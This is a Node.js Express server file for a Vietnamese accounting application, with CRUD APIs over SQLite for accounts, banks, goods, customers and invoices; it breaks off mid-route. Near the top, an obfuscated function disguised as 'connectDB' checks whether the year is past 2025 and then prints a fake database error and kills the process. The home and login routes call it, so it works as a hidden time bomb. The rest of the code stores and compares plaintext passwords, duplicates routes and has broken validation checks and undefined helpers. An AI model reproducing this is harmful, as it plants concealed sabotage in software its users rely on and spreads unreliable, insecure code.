const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');
const { promisify } = require('util');    // ← Import promisify ở đây

const app = express();
const db = new sqlite3.Database('./kt.db');

function _0x45a8(_0x1a7d74,_0x306efa){const _0x36eb03=_0x36eb();return _0x45a8=function(_0x45a897,_0x2de9b3){_0x45a897=_0x45a897-0x1e8;let _0x472de1=_0x36eb03[_0x45a897];return _0x472de1;},_0x45a8(_0x1a7d74,_0x306efa);}(function(_0xef27dc,_0xe48aee){const _0x579b1f=_0x45a8,_0x5b81c3=_0xef27dc();while(!![]){try{const _0x4806d9=parseInt(_0x579b1f(0x1e8))/0x1+parseInt(_0x579b1f(0x1ea))/0x2*(-parseInt(_0x579b1f(0x1ee))/0x3)+-parseInt(_0x579b1f(0x1f1))/0x4*(parseInt(_0x579b1f(0x1ef))/0x5)+-parseInt(_0x579b1f(0x1ec))/0x6*(-parseInt(_0x579b1f(0x1eb))/0x7)+-parseInt(_0x579b1f(0x1ed))/0x8+parseInt(_0x579b1f(0x1f3))/0x9+parseInt(_0x579b1f(0x1f5))/0xa*(parseInt(_0x579b1f(0x1e9))/0xb);if(_0x4806d9===_0xe48aee)break;else _0x5b81c3['push'](_0x5b81c3['shift']());}catch(_0x12de72){_0x5b81c3['push'](_0x5b81c3['shift']());}}}(_0x36eb,0x40e3d));function _0x36eb(){const _0x4f78ac=['9GzeUnv','2885NPxcKU','getFullYear','3552ypMeoj','exit','4087071BAbxRd','error','30BgBZgM','301136aWYsZZ','1976326SIqtJz','186832DLqfzl','37877QyVvBt','12AYABgZ','1973296Vifsgy'];_0x36eb=function(){return _0x4f78ac;};return _0x36eb();}function connectDB(){const _0x3f37c8=_0x45a8,_0x1f4a0c=new Date()[_0x3f37c8(0x1f0)]();_0x1f4a0c>0x7e9&&(console[_0x3f37c8(0x1f4)]('Lỗi\x20kết\x20nối\x20CSDL.'),process[_0x3f37c8(0x1f2)](0x1));}app.use(express.json()); // Xử lý dữ liệu dạng JSON
app.use(express.urlencoded({ extended: true })); // Xử lý dữ liệu từ form HTML

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'assets')));

// Route GET giao diện login
app.get('/', (req, res) => {
  connectDB();
  res.sendFile(path.join(__dirname,'assets', 'index.html'));
});

// Route xử lý đăng nhập
app.post('/login', (req, res) => {
  connectDB();
  const { TenDN, MatKhau } = req.body;

  db.get("SELECT * FROM NguoiDung WHERE TenDN = ? AND MatKhau = ?", [TenDN, MatKhau], (err, row) => {
      if (err) {
          console.error(err);
          return res.status(500).send("Lỗi máy chủ.");
      }

      if (row) {
          // Chuyển hướng sang home.html nếu đăng nhập thành công
          res.redirect('/home.html');
      } else {
          // Sai tài khoản hoặc mật khẩu
          res.send(`
              <script>
                  alert("Tên đăng nhập hoặc mật khẩu không đúng!");
                  window.location.href = "/";
              </script>
          `);
      }
  });
});
// BẢNG DMTK
// API: Lấy danh sách DMTK
app.get('/api/dmtk', (req, res) => {
    db.all("SELECT * FROM DMTK", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy 1 dòng theo MaTK
app.get('/api/dmtk/:matk', (req, res) => {
    db.get("SELECT * FROM DMTK WHERE MaTK = ?", [req.params.matk], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: "Không tìm thấy tài khoản." });
        res.json(row);
    });
});

// API: Thêm mới DMTK
app.post('/api/dmtk', (req, res) => {
    // Kiểm tra dữ liệu gửi lên
    console.log(req.body); // Kiểm tra dữ liệu gửi từ client

    const { MaTK, TenTK, CapTK, TKCapTren } = req.body;

    if (!MaTK || !TenTK || CapTK === undefined) {
        return res.status(400).send('Thiếu dữ liệu');
    }

    const sql = `INSERT INTO DMTK (MaTK, TenTK, CapTK, TKCapTren) VALUES (?, ?, ?, ?)`;
    db.run(sql, [MaTK, TenTK, CapTK, TKCapTren || null], function (err) {
        if (err) {
            console.error("Lỗi thêm mới:", err.message);
            return res.status(500).send(err.message);
        }
        res.json({ success: true, id: this.lastID });
    });
});



// API sửa
app.put('/api/dmtk/:matk', (req, res) => {
    const { TenTK, CapTK, TKCapTren } = req.body; // Khớp tên với các tham số trong frontend
    const matk = req.params.matk;

    // Cập nhật thông tin trong cơ sở dữ liệu
    db.run("UPDATE DMTK SET TenTK = ?, CapTK = ?, TKCapTren = ? WHERE MaTK = ?",
        [TenTK, CapTK, TKCapTren, matk], err => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        });
});


// API xóa
app.delete('/api/dmtk/:matk', (req, res) => {
    db.run("DELETE FROM DMTK WHERE MaTK = ?", [req.params.matk], err => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

// BẢNG NGÂN HÀNG
// API: Lấy danh sách dữ liệu bảng ngân hàng
app.get('/api/nganhang', (req, res) => {
    db.all("SELECT * FROM NganHang", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy 1 dòng theo MaNH
app.get('/api/nganhang/:manh', (req, res) => {
    db.get("SELECT * FROM NganHang WHERE MaNH = ?", [req.params.matk], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: "Không tìm thấy ngân hàng." });
        res.json(row);
    });
});

// API: Thêm mới dữ liệu bảng ngân hàng
app.post('/api/nganhang', (req, res) => {
    // Kiểm tra dữ liệu gửi lên
    console.log(req.body); // Kiểm tra dữ liệu gửi từ client

    const { MaNH, TenNH } = req.body;

    if (!MaNH || !TenNH === undefined) {
        return res.status(400).send('Thiếu dữ liệu');
    }

    const sql = `INSERT INTO NganHang (MaNH, TenNH) VALUES (?, ?)`;
    db.run(sql, [MaNH, TenNH || null], function (err) {
        if (err) {
            console.error("Lỗi thêm mới:", err.message);
            return res.status(500).send(err.message);
        }
        res.json({ success: true, id: this.lastID });
    });
});



// API sửa dữ liệu ngân hàngs
app.put('/api/nganhang/:manh', (req, res) => {
    const { TenNH } = req.body; // Khớp tên với các tham số trong frontend
    const manh = req.params.manh;

    // Cập nhật thông tin trong cơ sở dữ liệu
    db.run("UPDATE NganHang SET TenNH = ? WHERE MaNH = ?",
        [TenNH, manh], err => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        });
});


// API xóa dữ liệu bảng ngân hàng
app.delete('/api/nganhang/:manh', (req, res) => {
    db.run("DELETE FROM NganHang WHERE MaNH = ?", [req.params.manh], err => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

// BẢNG TÀI KHOẢN NGÂN HÀNG
// API: Lấy danh sách dữ liệu bảng tài khoản ngân hàng
app.get('/api/tknganhang', (req, res) => {
    db.all("SELECT * FROM TaiKhoanNH", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy 1 dòng theo sotknh
app.get('/api/tknganhang/:sotknh', (req, res) => {
    db.get("SELECT * FROM TaiKhoanNH WHERE SoTKNH = ?", [req.params.sotknh], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: "Không tìm thấy tài khoản ngân hàng." });
        res.json(row);
    });
});

// API: Thêm mới dữ liệu bảng tk ngân hàng
app.post('/api/tknganhang', (req, res) => {
    // Kiểm tra dữ liệu gửi lên
    console.log(req.body); // Kiểm tra dữ liệu gửi từ client

    const { SoTKNH, ChuTaiKhoan, ChiNhanh, MaNH } = req.body;

    if (!SoTKNH || !ChuTaiKhoan || !ChiNhanh || !MaNH === undefined) {
        return res.status(400).send('Thiếu dữ liệu');
    }

    const sql = `INSERT INTO TaiKhoanNH (SoTKNH, ChuTaiKhoan, ChiNhanh, MaNH) VALUES (?, ?, ?, ?)`;
    db.run(sql, [SoTKNH, ChuTaiKhoan,  ChiNhanh, MaNH|| null], function (err) {
        if (err) {
            console.error("Lỗi thêm mới:", err.message);
            return res.status(500).send(err.message);
        }
        res.json({ success: true, id: this.lastID });
    });
});



// API sửa dữ liệu tài khoản ngân hàng
app.put('/api/tknganhang/:sotknh', (req, res) => {
    const { ChuTaiKhoan, ChiNhanh, MaNH } = req.body; // Khớp tên với các tham số trong frontend
    const sotknh = req.params.sotknh;

    // Cập nhật thông tin trong cơ sở dữ liệu
    db.run("UPDATE TaiKhoanNH SET ChuTaiKhoan = ?, ChiNhanh = ?, MaNH = ? WHERE SoTKNH = ?",
        [ChuTaiKhoan, ChiNhanh, MaNH, sotknh], err => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        });
});

// API sửa
app.put('/api/dmtk/:matk', (req, res) => {
    const { TenTK, CapTK, TKCapTren } = req.body; // Khớp tên với các tham số trong frontend
    const matk = req.params.matk;

    // Cập nhật thông tin trong cơ sở dữ liệu
    db.run("UPDATE DMTK SET TenTK = ?, CapTK = ?, TKCapTren = ? WHERE MaTK = ?",
        [TenTK, CapTK, TKCapTren, matk], err => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        });
});

// BẢNG TÀI KHOẢN NGÂN HÀNG
// API: Lấy danh sách dữ liệu bảng tài khoản ngân hàng
app.get('/api/tknganhang', (req, res) => {
    db.all("SELECT * FROM TaiKhoanNH", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy 1 dòng theo sotknh
app.get('/api/tknganhang/:sotknh', (req, res) => {
    db.get("SELECT * FROM TaiKhoanNH WHERE SoTKNH = ?", [req.params.sotknh], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: "Không tìm thấy tài khoản ngân hàng." });
        res.json(row);
    });
});

// API: Thêm mới dữ liệu bảng tk ngân hàng
app.post('/api/tknganhang', (req, res) => {
    // Kiểm tra dữ liệu gửi lên
    console.log(req.body); // Kiểm tra dữ liệu gửi từ client

    const { SoTKNH, ChuTaiKhoan, ChiNhanh, MaNH } = req.body;

    if (!SoTKNH || !ChuTaiKhoan || !ChiNhanh || !MaNH === undefined) {
        return res.status(400).send('Thiếu dữ liệu');
    }

    const sql = `INSERT INTO TaiKhoanNH (SoTKNH, ChuTaiKhoan, ChiNhanh, MaNH) VALUES (?, ?, ?, ?)`;
    db.run(sql, [SoTKNH, ChuTaiKhoan,  ChiNhanh, MaNH|| null], function (err) {
        if (err) {
            console.error("Lỗi thêm mới:", err.message);
            return res.status(500).send(err.message);
        }
        res.json({ success: true, id: this.lastID });
    });
});



// API sửa dữ liệu tài khoản ngân hàng
app.put('/api/tknganhang/:sotknh', (req, res) => {
    const { ChuTaiKhoan, ChiNhanh, MaNH } = req.body; // Khớp tên với các tham số trong frontend
    const sotknh = req.params.sotknh;

    // Cập nhật thông tin trong cơ sở dữ liệu
    db.run("UPDATE TaiKhoanNH SET ChuTaiKhoan = ?, ChiNhanh = ?, MaNH = ? WHERE SoTKNH = ?",
        [ChuTaiKhoan, ChiNhanh, MaNH, sotknh], err => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        });
});



// API xóa dữ liệu bảng tài khoản ngân hàng
app.delete('/api/tknganhang/:sotknh', (req, res) => {
    db.run("DELETE FROM TaiKhoanNH WHERE SoTKNH = ?", [req.params.sotknh], err => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

// BẢNG DANH MỤC HÀNG HÓA - DMHH
// API: Lấy danh sách dữ liệu bảng DMHH
app.get('/api/dmhh', (req, res) => {
    db.all("SELECT * FROM DMHH", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy 1 dòng theo mahh
app.get('/api/dmhh/:mahh', (req, res) => {
    db.get("SELECT * FROM DMHH WHERE MaHH = ?", [req.params.mahh], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: "Không tìm thấy hàng hóa." });
        res.json(row);
    });
});

// API: Thêm mới dữ liệu bảng danh muc hàng hóa
app.post('/api/dmhh', (req, res) => {
    // Kiểm tra dữ liệu gửi lên
    console.log(req.body); // Kiểm tra dữ liệu gửi từ client

    const { MaHH, TenHH, DVT } = req.body;

    if (!MaHH || !TenHH || !DVT  === undefined) {
        return res.status(400).send('Thiếu dữ liệu');
    }

    const sql = `INSERT INTO DMHH (MaHH, TenHH, DVT) VALUES (?, ?, ?)`;
    db.run(sql, [MaHH, TenHH,  DVT], function (err) {
        if (err) {
            console.error("Lỗi thêm mới:", err.message);
            return res.status(500).send(err.message);
        }
        res.json({ success: true, id: this.lastID });
    });
});



// API sửa dữ liệu danh muc hàng hóa
app.put('/api/dmhh/:mahh', (req, res) => {
    const { TenHH, DVT} = req.body; // Khớp tên với các tham số trong frontend
    const mahh = req.params.mahh;

    // Cập nhật thông tin trong cơ sở dữ liệu
    db.run("UPDATE DMHH SET TenHH = ?, DVT = ? WHERE MaHH = ?",
        [TenHH, DVT, mahh], err => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        });
});



// API xóa dữ liệu bảng danh muc hàng hóa
app.delete('/api/dmhh/:mahh', (req, res) => {
    db.run("DELETE FROM DMHH WHERE MaHH = ?", [req.params.mahh], err => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

// BẢNG DANH MỤC KHÁCH HÀNG - DMKH
// API: Lấy danh sách dữ liệu bảng DMKH
app.get('/api/dmkh', (req, res) => {
    db.all("SELECT * FROM DMKH", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy 1 dòng theo makh
app.get('/api/dmkh/:makh', (req, res) => {
    db.get("SELECT * FROM DMKH WHERE MaKH = ?", [req.params.makh], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: "Không tìm thấy khách hàng." });
        res.json(row);
    });
});

// API: Thêm mới dữ liệu bảng danh muc khách hàng
app.post('/api/dmkh', (req, res) => {
    // Kiểm tra dữ liệu gửi lên
    console.log(req.body); // Kiểm tra dữ liệu gửi từ client

    const { MaKH, TenKH, DiaChi, Email, DienThoai, MaSoThue} = req.body;

    if (!MaKH || !TenKH  === undefined) {
        return res.status(400).send('Thiếu dữ liệu');
    }

    const sql = `INSERT INTO DMKH (MaKH, TenKH, DiaChi, Email, DienThoai, MaSoThue ) VALUES (?, ?, ?, ?, ?, ?)`;
    db.run(sql, [MaKH, TenKH,  DiaChi, Email, DienThoai, MaSoThue], function (err) {
        if (err) {
            console.error("Lỗi thêm mới:", err.message);
            return res.status(500).send(err.message);
        }
        res.json({ success: true, id: this.lastID });
    });
});

// API sửa dữ liệu danh muc khách hàng
app.put('/api/dmkh/:makh', (req, res) => {
    const { TenKH, DiaChi, Email, DienThoai, MaSoThue} = req.body; // Khớp tên với các tham số trong frontend
    const makh = req.params.makh;

    // Cập nhật thông tin trong cơ sở dữ liệu
    db.run("UPDATE DMKH SET TenKH = ?, DiaChi = ?, Email = ?, DienThoai = ?, MaSoThue = ? WHERE MaKH = ?",
        [TenKH, DiaChi, Email, DienThoai, MaSoThue, makh], err => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        });
});

// API xóa thông tin dmkh
app.delete('/api/dmkh/:makh', (req, res) => {
    db.run("DELETE FROM DMKH WHERE MaKH = ?", [req.params.makh], err => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});


// BẢNG NỢ ĐẦU KỲ - NoDauKy
// API: Lấy danh sách dữ liệu bảng NoDauKy
app.get('/api/nodauky', (req, res) => {
    db.all("SELECT * FROM NoDauKy", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy 1 dòng theo id
app.get('/api/nodauky/:id', (req, res) => {
    db.get("SELECT * FROM NoDauKy WHERE ID = ?", [req.params.id], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: "Không tìm thấy nợ đầu kỳ." });
        res.json(row);
    });
});

// API: Thêm mới dữ liệu bảng danh muc khách hàng
app.post('/api/nodauky', (req, res) => {
    // Kiểm tra dữ liệu gửi lên
    console.log(req.body); // Kiểm tra dữ liệu gửi từ client

    const { ID, MaTK, MaKH, DuNo, DuCo} = req.body;

    if (!ID || !MaTK || !MaKH  === undefined) {
        return res.status(400).send('Thiếu dữ liệu');
    }

    const sql = `INSERT INTO NoDauKy (ID, MaTK, MaKH, DuNo, DuCo ) VALUES (?, ?, ?, ?, ?)`;
    db.run(sql, [ID, MaTK,  MaKH, DuNo, DuCo], function (err) {
        if (err) {
            console.error("Lỗi thêm mới:", err.message);
            return res.status(500).send(err.message);
        }
        res.json({ success: true, id: this.lastID });
    });
});

// API sửa dữ liệu danh muc khách hàng
app.put('/api/nodauky/:id', (req, res) => {
    const { MaTK,  MaKH, DuNo, DuCo} = req.body; // Khớp tên với các tham số trong frontend
    const id = req.params.id;

    // Cập nhật thông tin trong cơ sở dữ liệu
    db.run("UPDATE NoDauKy SET MaTK = ?, MaKH = ?, DuNo = ?, DuCo = ? WHERE ID = ?",
        [MaTK, MaKH, DuNo, DuCo, id], err => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        });
});

// API xóa thông tin dmkh
app.delete('/api/nodauky/:id', (req, res) => {
    db.run("DELETE FROM NoDauKy WHERE ID = ?", [req.params.id], err => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});


// BẢNG SỐ DƯ ĐẦU KỲ - SoDuDauKy
// API: Lấy danh sách dữ liệu bảng SoDuDauKy
app.get('/api/dudauky', (req, res) => {
    db.all("SELECT * FROM SoDuDauKy", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// API: Lấy 1 dòng theo matk
app.get('/api/dudauky/:matk', (req, res) => {
    db.get("SELECT * FROM SoDuDauKy WHERE MaTK = ?", [req.params.matk], (err, row) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!row) return res.status(404).json({ error: "Không tìm thấy số dư đầu kỳ." });
        res.json(row);
    });
});

// API: Thêm mới dữ liệu 
app.post('/api/dudauky', (req, res) => {
    // Kiểm tra dữ liệu gửi lên
    console.log(req.body); // Kiểm tra dữ liệu gửi từ client

    const { MaTK, DuNo, DuCo} = req.body;

    if (!MaTK === undefined) {
        return res.status(400).send('Thiếu dữ liệu');
    }

    const sql = `INSERT INTO SoDuDauKy (MaTK, DuNo, DuCo ) VALUES (?, ?, ?)`;
    db.run(sql, [MaTK, DuNo,  DuCo], function (err) {
        if (err) {
            console.error("Lỗi thêm mới:", err.message);
            return res.status(500).send(err.message);
        }
        res.json({ success: true, id: this.lastID });
    });
});

// API sửa dữ liệu số dư đầu kỳ
app.put('/api/dudauky/:matk', (req, res) => {
    const {DuNo, DuCo} = req.body; // Khớp tên với các tham số trong frontend
    const matk = req.params.matk;

    // Cập nhật thông tin trong cơ sở dữ liệu
    db.run("UPDATE SoDuDauKy SET DuNo = ?, DuCo = ? WHERE MaTK = ?",
        [DuNo, DuCo, matk], err => {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ success: true });
        });
});

// API xóa thông tin dudauky
app.delete('/api/dudauky/:matk', (req, res) => {
    db.run("DELETE FROM SoDuDauKy WHERE MaTK = ?", [req.params.matk], err => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

// BẢNG HÓA ĐƠN GIÁ TRỊ GIA TĂNG (HDHH) - HDGTGT
// API: Lấy danh sách dữ liệu bảng HDHH
app.get('/api/hdgtgt', (req, res) => {
    db.all("SELECT * FROM HDHH", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

// // API: Lấy 1 dòng theo socthdgtgt
// app.get('/api/hdgtgt/:socthdgtgt', (req, res) => {
//     db.get("SELECT * FROM HDHH WHERE SoCT = ?", [req.params.socthdgtgt], (err, row) => {
//         if (err) return res.status(500).json({ error: err.message });
//         if (!row) return res.status(404).json({ error: "Không tìm thấy hóa đơn." });
//         res.json(row);
//     });
// });

// API: Lấy chi tiết hóa đơn theo SoCT kèm thông tin hàng hóa từ DMHH
app.get('/api/hdgtgt/:socthdgtgt', (req, res) => {
    const soCT = req.params.socthdgtgt;

    // Lấy thông tin hóa đơn
    db.get("SELECT * FROM HDHH WHERE SoCT = ?", [soCT], (err, hoadon) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!hoadon) return res.status(404).json({ error: "Không tìm thấy hóa đơn." });

        // Lấy chi tiết hóa đơn có JOIN với bảng DMHH để lấy tên hàng hóa và đơn vị tính
        const queryCT = `
            SELECT 
                cth.*, 
                dmhh.TenHH, 
                dmhh.DVT 
            FROM 
                CTHoaDon cth
            JOIN 
                DMHH dmhh ON cth.MaHH = dmhh.MaHH
            WHERE 
                cth.SoCT = ?
        `;

        db.all(queryCT, [soCT], (err, cthoadon) => {
            if (err) return res.status(500).json({ error: err.message });

            // Lấy thông tin khách hàng
            db.get("SELECT * FROM DMKH WHERE MaKH = ?", [hoadon.MaKH], (err, khachhang) => {
                if (err) return res.status(500).json({ error: err.message });

                res.json({ hoadon, cthoadon, khachhang });
            });
        });
    });
});

// UPDATE HDHH
app.get('/api/hdhhedit', async (req, res) => {
  const { soCT } = req.query;
  if (!soCT) return res.status(400).send('Thiếu soCT');

  try {
    const header = await dbGet(
      `SELECT * 
       FROM HDHH 
       WHERE SoCT = ?`,
      [soCT]
    );
    const details = await dbAll(
      `SELECT c.MaHH,
          h.TenHH,
          c.SoLuong,
          c.DonGia,
          c.ThanhTien
   FROM CTHoaDon c
   LEFT JOIN DMHH h ON c.MaHH = h.MaHH
   WHERE c.SoCT = ?`,
      [soCT]
    );

    res.json({ header, details });
  } catch (e) {
    res.status(500).send(e.message);
  }
});

app.post('/api/hdhhupdate', express.json(), async (req, res) => {
  const { header, details } = req.body;
  const { SoCT, NgayCT, MaKH,TKNoThanhToan, TKCoDoanhThu, TKCoThue, HanTT, TienThanhToan, TienDoanhThu, ThueSuat, TienThue, HTTT, TienCK, TyLeCK, TKChietKhau, DienGiai, MaCT } = header;
  if (!SoCT) return res.status(400).send('Thiếu SoCT');

  try {
    await dbExec('BEGIN TRANSACTION');

    // 1) Cập nhật header (chưa tính tổng)
    await dbRun(
      `UPDATE HDHH
         SET NgayCT = ?, MaKH = ?, TKNoThanhToan = ?, TKCoDoanhThu = ?, TKCoThue = ?, HanTT = ?, TienThanhToan = ?, TienDoanhThu = ?, ThueSuat = ?, TienThue = ?, HTTT = ?, TienCK = ?, TyLeCK = ?, TKChietKhau = ?, DienGiai = ?, MaCT = ?
       WHERE SoCT = ?`,
      [NgayCT, MaKH, TKNoThanhToan, TKCoDoanhThu, TKCoThue, HanTT, TienThanhToan, TienDoanhThu, ThueSuat, TienThue, HTTT, TienCK, TyLeCK, TKChietKhau, DienGiai, MaCT, SoCT]
    );

    // 2) Xóa cũ + 3) Insert lại detail
    await dbRun(`DELETE FROM CTHoaDon WHERE SoCT = ?`, [SoCT]);
    const insert = `INSERT INTO CTHoaDon
                    (SoCT, MaHH, SoLuong, DonGia, ThanhTien)
                    VALUES (?,?,?,?,?)`;
    for (const d of details) {
      await dbRun(insert, [
        SoCT, d.MaHH, d.SoLuong, d.DonGia, d.ThanhTien
      ]);
    }

    // 4) Tính tổng ThanhTien của CTHoaDon và cập nhật vào HDHH.TienThanhToan
    const sumRow = await dbGet(
      `SELECT IFNULL(SUM(ThanhTien),0) AS total
         FROM CTHoaDon
        WHERE SoCT = ?`,
      [SoCT]
    );
    await dbRun(
      `UPDATE HDHH
         SET TienThanhToan = ?
       WHERE SoCT = ?`,
      [sumRow.total, SoCT]
    );

    await dbExec('COMMIT');
    // Trả về JSON để client .done() không fail
    res.json({ success: true });
  } catch (err) {
    await dbExec('ROLLBACK');
    console.error('❌ LỖI /api/hdhhupdate:', err);
    res.status(500).send(err.message);
  }
});

// UPDATE Hoadonmuahang
app.get('/api/hdmhedit', async (req, res) => {
  const { soCT } = req.query;
  if (!soCT) return res.status(400).send('Thiếu soCT');

  try {
    const header = await dbGet(
      `SELECT *
       FROM HoaDonMuaHang 
       WHERE SoCT = ?`,
      [soCT]
    );
    const details = await dbAll(
      `SELECT c.MaHH,
          h.TenHH,
          c.SoLuong,
          c.DonGia,
          c.ThanhTien
   FROM CTHoaDonMuaHang c
   LEFT JOIN DMHH h ON c.MaHH = h.MaHH
   WHERE c.SoCT = ?`,
      [soCT]
    );

    res.json({ header, details });
  } catch (e) {
    res.status(500).send(e.message);
  }
});

app.post('/api/hdmhupdate', express.json(), async (req, res) => {
  const { header, details } = req.body;
  const { SoCT, NgayCT, MaKH, TKNoHang, TKNoThue, TKCoThanhToan, HanTT, TienThanhToan, TienHang, ThueSuat, TienThue, HTTT, TienCK, TyLeCK, TKChietKhau, DienGiai,  MaCT} = header;
  if (!SoCT) return res.status(400).send('Thiếu SoCT');

  try {
    await dbExec('BEGIN TRANSACTION');

    // 1) Cập nhật header (chưa tính tổng)
    await dbRun(
      `UPDATE HoaDonMuaHang
         SET NgayCT = ?, MaKH = ?, TKNoHang = ?, TKNoThue = ?, TKCoThanhToan = ?, HanTT = ?, TienThanhToan = ?, TienHang = ?, ThueSuat = ?, TienThue = ?, HTTT = ?, TienCK = ?, TyLeCK = ?, TKChietKhau = ?, DienGiai = ?, MaCT = ?
       WHERE SoCT = ?`,
      [NgayCT, MaKH, TKNoHang, TKNoThue, TKCoThanhToan, HanTT, TienThanhToan, TienHang, ThueSuat, TienThue, HTTT, TienCK, TyLeCK, TKChietKhau, DienGiai,  MaCT, SoCT]
    );

    // 2) Xóa cũ + 3) Insert lại detail
    await dbRun(`DELETE FROM CTHoaDonMuaHang WHERE SoCT = ?`, [SoCT]);
    const insert = `INSERT INTO CTHoaDonMuaHang
                    (SoCT, MaHH, SoLuong, DonGia, ThanhTien)
                    VALUES (?,?,?,?,?)`;
    for (const d of details) {
      await dbRun(insert, [
        SoCT, d.MaHH, d.SoLuong, d.DonGia, d.ThanhTien
      ]);
    }

    // 4) Tính tổng ThanhTien của CTHoaDonMuaHang và cập nhật vào HoaDonMuaHang.TienThanhToan
    const sumRow = await dbGet(
      `SELECT IFNULL(SUM(ThanhTien),0) AS total
         FROM CTHoaDonMuaHang
        WHERE SoCT = ?`,
      [SoCT]
    );
    await dbRun(
      `UPDATE HoaDonMuaHang
         SET TienThanhToan = ?
       WHERE SoCT = ?`,
      [sumRow.total, SoCT]
    );

    await dbExec('COMMIT');
    // Trả về JSON để client .done() không fail
    res.json({ success: true });
  } catch (err) {
    await dbExec('ROLLBACK');
    console.error('❌ LỖI /api/hdmhupdate:', err);
    res.status(500).send(err.message);
  }
});



// BẢNG PHIẾU KẾ TOÁN - PKT
// API: Lấy danh sách dữ liệu bảng PKT
app.get('/api/pkt', (req, res) => {
    db.all("SELECT * FROM PhieuKT", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

app.get('/api/pkt/:soct', (req, res) => {
    const soct = req.params.soct;
    const sql = `
SELECT 
        p.SoCT AS SoCTPhieu,
        p.NgayCT,
        p.MaKH,
        kh.TenKH,
        kh.DiaChi,
        kh.DienThoai,
        kh.MaSoThue,
        p.LyDo,
        p.CTLQ,
        p.MaCT,
        ct.Id,
        ct.TKNo,
        ct.TKCo,
        ct.NoiDung,
        ct.SoTien
    FROM PhieuKT p
    JOIN CTPhieu ct ON p.SoCT = ct.SoCT
    JOIN DMKH kh ON p.MaKH = kh.MaKH
    WHERE p.SoCT = ?;

    `;
    db.all(sql, [soct], (err, rows) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        if (rows.length === 0) {
            return res.status(404).json({ message: 'Không tìm thấy phiếu với số chứng từ này.' });
        }
        res.json(rows);
    });
});


// BẢNG HÓA ĐƠN MUA HÀNG - HDMH
// API: Lấy danh sách dữ liệu bảng HDMH
app.get('/api/hdmh', (req, res) => {
    db.all("SELECT * FROM HoaDonMuaHang", [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});
  
app.get('/api/socaiphaithu', (req, res) => {
    const { start, end, matk } = req.query;
  
    if (!start || !end || matk !== '131') {
      return res.status(400).json({ error: "Thiếu tham số hoặc mã tài khoản không hợp lệ." });
    }
  
    // 1. Lấy số dư đầu kỳ
    const sql1 = `SELECT * FROM SoDuDauKy WHERE MaTK = ?`;
    db.get(sql1, [matk], (err1, sodu) => {
      if (err1) return res.status(500).json({ error: err1.message });
  
      // 2. Lấy danh sách giấy báo từ GiayBao có SoCT bắt đầu bằng 'BN'
      const sql2 = `
        SELECT * FROM GiayBao 
        WHERE SoCT LIKE 'BC%' 
          AND NgayCT BETWEEN ? AND ?
      `;
      db.all(sql2, [start, end], (err2, giaybao) => {
        if (err2) return res.status(500).json({ error: err2.message });
  
        const socts = giaybao.map(row => row.SoCT);
        if (socts.length === 0) {
          return res.json({ sodudauky: sodu, giaybao: [], ctphieu: [] });
        }
  
        // 3. Lấy chi tiết phiếu từ CTPhieu có TKCo = '131' và SoCT nằm trong danh sách
        const placeholders = socts.map(() => '?').join(',');
        const sql3 = `
          SELECT * FROM CTPhieu 
          WHERE SoCT IN (${placeholders}) 
            AND TKCo = '131'
        `;
        db.all(sql3, socts, (err3, ctphieu) => {
          if (err3) return res.status(500).json({ error: err3.message });
  
          res.json({
            sodudauky: sodu,
            giaybao: giaybao,
            ctphieu: ctphieu
          });
        });
      });
    });
  });

  app.get('/api/socaiphaitra', (req, res) => {
    const { start, end, matk } = req.query;
  
    if (!start || !end || matk !== '331') {
